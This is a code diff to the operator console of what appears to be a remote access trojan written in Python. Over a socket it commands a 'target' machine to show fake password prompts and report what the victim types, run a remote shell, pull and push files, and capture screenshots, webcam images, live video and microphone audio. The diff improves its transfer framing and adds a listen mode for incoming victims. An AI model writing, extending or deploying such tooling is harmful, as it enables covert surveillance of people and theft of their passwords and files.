@@ -3,11 +3,12 @@ from PIL import Image
 import cv2
 from numpy import array 
 import numpy as np
-from json import loads,dumps
+from json import loads,dumps,JSONDecodeError
 import wave
 from time import sleep
 from platform import system as osType
 from colorama import Fore,Back
+from os.path import isfile
 from os import system
 from cryptography.fernet import Fernet
 def clear():
@@ -29,21 +30,26 @@ def encryptFS(dataBorS,key):
         Eobj=Fernet(key)
         res=Eobj.encrypt(dataBorS)
         return res
+def clearBuffer(sock):
+    sock.settimeout(0.5)
+    while 1:
+        try:
+            sock.recv(1000000)
+        except socket.timeout :
+            break
 def others(sock):
     clear()
     def funAlert():
         imagePath=input(f"{Fore.LIGHTGREEN_EX}Choose an image for alert (you can find good images in the images folder!)\n\nEnter image file path : {Fore.RESET}")
-        try:
-            imPathrd=open(imagePath,"r")
-        except FileNotFoundError:
+        if isfile(imagePath):
+            Oimg=Image.open(imagePath)
+            sock.send("HDalert".encode())
+            dumpList=dumps(array(Oimg).tolist())
+            sock.send(dumpList.encode())
+            sock.send(b"END")
+            input(f"{Fore.LIGHTGREEN_EX}[ * ] Done !\n\nEnter to continue : ")
+        else:
             input(f"{Fore.LIGHTRED_EX}Error : {imagePath} No such file !\n\nEnter to continue : {Fore.RESET}")
-        Oimg=Image.open(imagePath)
-        sock.send("HDalert".encode())
-        dumpList=dumps(array(Oimg).tolist())
-        sock.send(dumpList.encode())
-        sleep(0.25)
-        sock.send(b"")
-        input(f"{Fore.LIGHTGREEN_EX}[ * ] Done !\n\nEnter to continue : ")
     def systemInfo():
         sock.send("Sinfo".encode())
         info=sock.recv(4098).decode().split("|")
@@ -65,6 +71,8 @@ def others(sock):
     elif selection=="2":
         systemInfo()
 def popup(sock):
+    clearBuffer(sock)
+    sock.settimeout(None)
     selection=input(f"""
 {Fore.MAGENTA}    0_
 {Fore.MAGENTA}       \`.     ___
@@ -164,9 +172,10 @@ def popup(sock):
         else:
             sock.sendall(f"WNpasswd|{title}|{text}".encode())
         print(f"\n\n{Fore.LIGHTGREEN_EX}Please wait for the target to enter some value ...{Fore.RESET}")
-        resault=sock.recv(2048)
-        print(f"\n\n{Fore.LIGHTRED_EX}Target entered : \n{Fore.LIGHTGREEN_EX}{resault.decode()}\n{Fore.RESET}")
-        input(f"\n\n{Fore.LIGHTCYAN_EX}Enter to continue : {Fore.RESET}")
+        resault=sock.recv(1000000).decode().replace("END","")
+        if resault:
+            print(f"\n\n{Fore.LIGHTRED_EX}Target entered : \n{Fore.LIGHTGREEN_EX}{resault}\n{Fore.RESET}")
+            input(f"\n\n{Fore.LIGHTCYAN_EX}Enter to continue : {Fore.RESET}")
 def shell(sock,key):
     key=key.encode()
     sock.send("RMCM".encode())
@@ -181,6 +190,8 @@ def shell(sock,key):
                 print(res)
 def getFex(sock):
     clear()
+    clearBuffer(sock)
+    sock.settimeout(None)
     slcn=input(f"""{Fore.YELLOW}
                     .----.______
                     |File       |
@@ -206,7 +217,7 @@ def getFex(sock):
         filename+=input(f"{Fore.MAGENTA}Enter the file name : {Fore.RESET}")
         sock.send(filename.encode())
         sleep(0.5)
-        files=sock.recv(1024).decode()
+        files=sock.recv(1024).decode().replace("END",'')
         print(f"{Fore.LIGHTCYAN_EX}Result : {Fore.LIGHTGREEN_EX}{files}")
         input(f"\n\n{Fore.LIGHTRED_EX}Enter to continue : {Fore.RESET}")
     elif slcn=="2":
@@ -214,14 +225,14 @@ def getFex(sock):
         path+=input(f"{Fore.MAGENTA}Enter the path : {Fore.RESET}")
         sock.send(path.encode())
         sleep(0.5)
-        res=sock.recv(1024).decode()
+        res=sock.recv(1024).decode().replace("END",'')
         print(f"{Fore.LIGHTCYAN_EX}Result : {Fore.LIGHTGREEN_EX}{res}")
         input(f"\n\n{Fore.LIGHTRED_EX}Enter to continue : {Fore.RESET}")
     elif slcn=="3":
         filename="FXshf:"
         sock.send(filename.encode())
         sleep(0.5)
-        files=sock.recv(1024).decode()
+        files=sock.recv(1024).decode().replace("END",'')
         print(f"{Fore.LIGHTCYAN_EX}Result : {Fore.LIGHTGREEN_EX}{files}")
         input(f"\n\n{Fore.LIGHTRED_EX}Enter to continue : {Fore.RESET}")
     elif slcn=="5" or slcn=='4':
@@ -248,6 +259,7 @@ def getFex(sock):
                 print(f"\n\n{Fore.LIGHTCYAN_EX}Resault : {Fore.RESET}",filesize)
                 input(f"\n\n{Fore.LIGHTRED_EX}Enter to continue : {Fore.RESET}")
                 return 1
+            
         if slcn=='4':
             sock.settimeout(2)
         with open(filename.split(":")[1] ,"wb") as f:
@@ -256,7 +268,11 @@ def getFex(sock):
                     data=sock.recv(buffer)
                 except socket.timeout:
                     break
-                if not data:
+                if "END" in str(data[len(data)-3:]) :
+                    data=data[0:(len(data)-3)]
+                    f.write(data)    
+                    break
+                if not data :
                     break
                 f.write(data)
             f.close()
@@ -271,6 +287,7 @@ def getFex(sock):
                         if not rdata:
                             break
                         sock.sendall(rdata)
+                    sock.send(b"END")
             except FileNotFoundError:
                 input(f"{Fore.RED}{Back.BLACK}Can't find {filename},Why did you delete it ?!\n\n{Fore.LIGHTCYAN_EX}Enter to continue : {Fore.RESET}{Back.RESET}")
 
@@ -291,16 +308,23 @@ def getFex(sock):
                 while 1:
                     rawData=BFile.read(buffer)
                     if not rawData:
+                        sock.send(b"END")    
                         return 1
                     sock.sendall(rawData)
         except FileNotFoundError :
             print(f"{Fore.RED}Can't open file : {Ufile} {Fore.RESET}")
+
+
 def getScr(sock):
     data=''
     while 1:    
-        x=sock.recv(8388608).decode()
-        if x.strip() :
-            data+=x
+        data2=sock.recv(8388608).decode()
+        if "END" in data2:
+            data2=data2.replace("END",'')
+            data+=data2
+            break
+        elif data2.strip() :
+            data+=data2
         else:
             break
     if data:
@@ -308,17 +332,22 @@ def getScr(sock):
         img=Image.fromarray(CVimg)
         img.save("screenshot.jpg")
 def getPict(sock):
+    
     data=''
     while 1:    
-        x=sock.recv(8388608).decode()
-        if x.strip() :
-            data+=x
+        data2=sock.recv(8388608).decode()
+        if data2.strip() :
+            if 'END' in str(data2):
+                if len(data2) > 3:
+                    data+=(data2[0:(len(data2)-3)])
+                break
+            data+=data2
         else:
             break
     if data:
+        data=data.replace("END","")
         frame=array(loads(data))
         cv2.imwrite("image.jpg",frame)
-        
 def getLive(sock):
     try:
         while 1:
@@ -328,12 +357,18 @@ def getLive(sock):
                 if "END" in data:
                     data=data.split("END")[0]
                     break
-            frame=array(loads(data), dtype=np.uint8)
-            cv2.imshow('LIVE(Insert the CTRL-c to exit)',frame)
+            sock.send(b"cnt")
+            try:
+                frame=array(loads(data), dtype=np.uint8)
+                cv2.imshow('LIVE(Insert the CTRL-c to exit)',frame)
+            except JSONDecodeError:
+                pass
             if cv2.waitKey(1) & 0xFF == ord('q'):
+                sock.send(b"end")
                 break
     except KeyboardInterrupt :
         cv2.destroyAllWindows()
+        sock.send(b"end")
         return True
 def getSound(sock,sec):
     sock.send(str(sec).encode())
@@ -346,30 +381,42 @@ def getSound(sock,sec):
     frames=[]
     while 1:
         data_02=sock.recv(40000)
-        frames.append(data_02)
-        if not data_02:
+        if 'END' in str(data_02):
+            
+            if len(data_02) > 3:
+                frames.append(data_02[0:(len(data_02)-3)])
             break
+        frames.append(data_02)
     wf.writeframes(b''.join(frames))
     wf.close()
-def main():
-    host=input(f'{Fore.LIGHTYELLOW_EX}\n[*] Enter the host : ')
+def main(mode):
+    host=input(f'{Fore.LIGHTYELLOW_EX}\n[*] Enter the host : {Fore.RESET}')
+    clear()
     while 1:
-        clear()
         try:
-            port=int(input(f'\n[*]Enter the port : {Fore.RESET}'))
+            port=int(input(f'\n{Fore.LIGHTYELLOW_EX}[*]Enter the port : {Fore.RESET}'))
+            clear()
             break
         except ValueError:
             pass
-    
-
-    def connt():
-        try:    
-            sock=socket.socket(socket.AF_INET , socket.SOCK_STREAM)
+    sock=socket.socket(socket.AF_INET , socket.SOCK_STREAM)
+    try:
+        if mode=="server":
+            while 1:
+                try:
+                    lstnNum=int(input(f'{Fore.LIGHTYELLOW_EX}\n[*]Enter the listen number : {Fore.RESET}'))
+                    break
+                except ValueError:
+                    pass
+            sock.bind((host,port))
+            sock.listen(lstnNum)
+            print(f"{Fore.LIGHTGREEN_EX}\n\n[ * ] Waiting for the client ...{Fore.RESET}")
+            sock,addr=sock.accept()
+        elif mode =="client":
             sock.connect((host,port))
-            clear()
-            return sock
-        except :
-            print(rf'''
+            
+    except :
+        print(rf'''
 {Fore.LIGHTYELLOW_EX}    .-.                                {Fore.LIGHTGREEN_EX}_________{Fore.RESET}
 {Fore.LIGHTYELLOW_EX}   / _ \                              {Fore.LIGHTGREEN_EX}|{Fore.RESET}  {Fore.RED}Error{Fore.RESET}  {Fore.LIGHTGREEN_EX}|{Fore.RESET}
 {Fore.LIGHTYELLOW_EX}  | ' ) |                  {Fore.LIGHTGREEN_EX}+----------+---------+-----------+{Fore.RESET}
@@ -390,9 +437,10 @@ def main():
    |.' \      .'`/.
     `___)x/\x(__/_`
     ///__/__\___\\\ {Fore.RESET}''')
-            exit()
+        exit()
     while 1:
-        sock=connt()
+        clearBuffer(sock)
+        sock.settimeout(None)
         clear()
         selection=input(rf"""{Fore.RESET}
          {Fore.CYAN}____                                                                   {Fore.RESET}
@@ -445,12 +493,8 @@ Enter your selection : """)
             try:
                 while 1:
                     getFex(sock)
-                    sock=connt()
-
             except KeyboardInterrupt :
                 pass
-            except ConnectionResetError:
-                sock=connt()
         elif selection=='6':
             clear()
             key=input(f"{Fore.LIGHTBLUE_EX}Enter the encryption / decryption token : {Fore.RESET}")
